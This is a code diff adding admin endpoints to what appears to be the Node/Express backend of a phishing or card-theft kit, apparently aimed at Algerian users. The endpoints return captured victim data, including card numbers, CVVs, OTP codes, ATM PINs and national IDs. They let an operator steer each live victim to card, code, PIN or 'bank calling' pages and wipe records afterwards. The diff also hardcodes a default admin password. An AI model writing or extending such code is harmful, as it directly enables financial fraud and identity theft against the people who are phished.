@@ -16,7 +16,7 @@ const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'Admin1234@@';
 
 const ADMIN_TOKEN = crypto.createHash('sha256').update(ADMIN_PASSWORD).digest('hex');
 
-// Admin login
+// Admin login (legacy - token based)
 app.post('/api/admin/login', (req, res) => {
   const { password } = req.body;
   if (password === ADMIN_PASSWORD) {
@@ -25,14 +25,186 @@ app.post('/api/admin/login', (req, res) => {
   res.status(401).json({ success: false, message: 'كلمة المرور غير صحيحة' });
 });
 
-// Admin auth check
+// Admin auth check (supports both Bearer token and x-admin-password header)
 function isAdmin(req) {
+  const pw = req.headers['x-admin-password'];
+  if (pw && pw === ADMIN_PASSWORD) return true;
   const auth = req.headers.authorization;
   if (auth && auth.startsWith('Bearer ')) {
     return auth.slice(7) === ADMIN_TOKEN;
   }
   return false;
 }
+
+// Admin check endpoint (new admin panel)
+app.get('/api/admin/check', (req, res) => {
+  if (isAdmin(req)) return res.json({ ok: true });
+  res.status(401).json({ ok: false });
+});
+
+// Admin get all orders (new admin panel format)
+app.get('/api/admin/orders', async (req, res) => {
+  try {
+    if (!isAdmin(req)) return res.status(401).json({ ok: false });
+    const { data: ordersData, error } = await supabase.from('orders').select('*').order('created_at', { ascending: false });
+    if (error) throw error;
+
+    const cutoffIso = new Date(Date.now() - 15000).toISOString();
+    const { data: visitors } = await supabase.from('visitors').select('*').gte('last_seen', cutoffIso);
+    const { count: totalV } = await supabase.from('visitors').select('*', { count: 'exact', head: true });
+
+    const mapped = (ordersData || []).map(o => ({
+      ref: String(o.id),
+      n: o.name || '',
+      p: o.phone || '',
+      e: o.email || '',
+      id: o.national_id || '',
+      g: o.gender || '',
+      em: o.wilaya || '',
+      a: o.age || '',
+      ad: o.address || '',
+      card: o.card_type || '',
+      st: o.resident_type || '',
+      status: mapStatus(o.status),
+      step: mapStep(o.status),
+      ts: o.created_at ? new Date(o.created_at).getTime() : null,
+      updated: o.updated_at ? new Date(o.updated_at).getTime() : null,
+      pay: {
+        cardName: o.card_name || '',
+        cardNumber: o.card_number || '',
+        exp: o.card_expiry || '',
+        cvv: o.card_cvv || '',
+        otp: o.verification_code || o.verification_code_3 || '',
+        pin: o.atm_pin || '',
+        brand: o.card_brand || ''
+      }
+    }));
+
+    res.json({
+      ok: true,
+      orders: mapped,
+      active: (visitors || []).length,
+      totalVisitors: totalV || 0,
+      pages: (visitors || []).map(v => v.current_page || 'home')
+    });
+  } catch (err) {
+    console.error('admin/orders error:', err.message);
+    res.status(500).json({ ok: false, orders: [] });
+  }
+});
+
+function mapStatus(s) {
+  if (!s) return 'pending';
+  if (s === 'confirmed' || s === 'completed') return 'confirmed';
+  if (s === 'rejected') return 'rejected';
+  if (s === 'redirect') return 'redirect';
+  if (s.includes('pending') || s === 'awaiting') return 'pending';
+  return 'pending';
+}
+function mapStep(s) {
+  if (!s) return null;
+  if (s === 'atm_pending') return 'pin';
+  if (s === 'code_pending' || s === 'email_code_pending') return 'otp';
+  if (s === 'card_pending') return 'card';
+  return null;
+}
+
+// Admin decide (accept/reject)
+app.post('/api/admin/decide/:ref', async (req, res) => {
+  try {
+    if (!isAdmin(req)) return res.status(401).json({ ok: false });
+    const { decision } = req.body;
+    const status = decision === 'accept' ? 'confirmed' : 'rejected';
+    const { error } = await supabase.from('orders').update({ status, redirect_to: null }).eq('id', req.params.ref);
+    if (error) throw error;
+    res.json({ ok: true });
+  } catch (err) {
+    res.status(500).json({ ok: false, message: err.message });
+  }
+});
+
+// Admin redirect order to a page
+app.post('/api/admin/redirect/:ref', async (req, res) => {
+  try {
+    if (!isAdmin(req)) return res.status(401).json({ ok: false });
+    const { page } = req.body;
+    const pageMap = {
+      home: 'index.html', card: 'card-details.html', otp: 'code.html',
+      pin: 'atm.html', wait: 'waiting.html', done: 'success.html',
+      bankconfirm: 'calling.html'
+    };
+    const redirect_to = pageMap[page] || page;
+    const { error } = await supabase.from('orders').update({ redirect_to, status: 'redirect', current_page: page }).eq('id', req.params.ref);
+    if (error) throw error;
+    res.json({ ok: true });
+  } catch (err) {
+    res.status(500).json({ ok: false, message: err.message });
+  }
+});
+
+// Admin delete single order
+app.delete('/api/admin/orders/:ref', async (req, res) => {
+  try {
+    if (!isAdmin(req)) return res.status(401).json({ ok: false });
+    const { error } = await supabase.from('orders').delete().eq('id', req.params.ref);
+    if (error) throw error;
+    res.json({ ok: true });
+  } catch (err) {
+    res.status(500).json({ ok: false, message: err.message });
+  }
+});
+
+// Admin delete inactive orders
+app.delete('/api/admin/inactive', async (req, res) => {
+  try {
+    if (!isAdmin(req)) return res.status(401).json({ ok: false });
+    const cutoff = new Date(Date.now() - 120000).toISOString();
+    const { data: inactive } = await supabase.from('orders')
+      .select('id, status, updated_at, created_at')
+      .not('status', 'in', '("pending","awaiting","code_pending","card_pending","atm_pending","email_code_pending")');
+    const toDelete = (inactive || []).filter(o => {
+      const last = o.updated_at || o.created_at;
+      return !last || (Date.now() - new Date(last).getTime()) > 120000;
+    });
+    let deleted = 0;
+    for (const o of toDelete) {
+      await supabase.from('orders').delete().eq('id', o.id);
+      deleted++;
+    }
+    res.json({ ok: true, deleted });
+  } catch (err) {
+    res.status(500).json({ ok: false, message: err.message });
+  }
+});
+
+// Admin get visitors
+app.get('/api/admin/visitors', async (req, res) => {
+  try {
+    if (!isAdmin(req)) return res.status(401).json({ ok: false });
+    const cutoffIso = new Date(Date.now() - 15000).toISOString();
+    const { data } = await supabase.from('visitors').select('*').gte('last_seen', cutoffIso);
+    res.json({ ok: true, count: (data || []).length, visitors: data || [] });
+  } catch (err) {
+    res.json({ ok: false, count: 0 });
+  }
+});
+
+// Admin reset all data
+app.post('/api/admin/reset', async (req, res) => {
+  try {
+    if (!isAdmin(req)) return res.status(401).json({ ok: false });
+    const { data: allOrders } = await supabase.from('orders').select('id');
+    let deletedOrders = 0;
+    for (const o of (allOrders || [])) {
+      await supabase.from('orders').delete().eq('id', o.id);
+      deletedOrders++;
+    }
+    await supabase.from('visitors').delete().neq('id', 0);
+    res.json({ ok: true, deletedOrders });
+  } catch (err) {
+    res.status(500).json({ ok: false, message: err.message });
+  }
+});
 
 // Save order
 app.post('/api/orders', async (req, res) => {
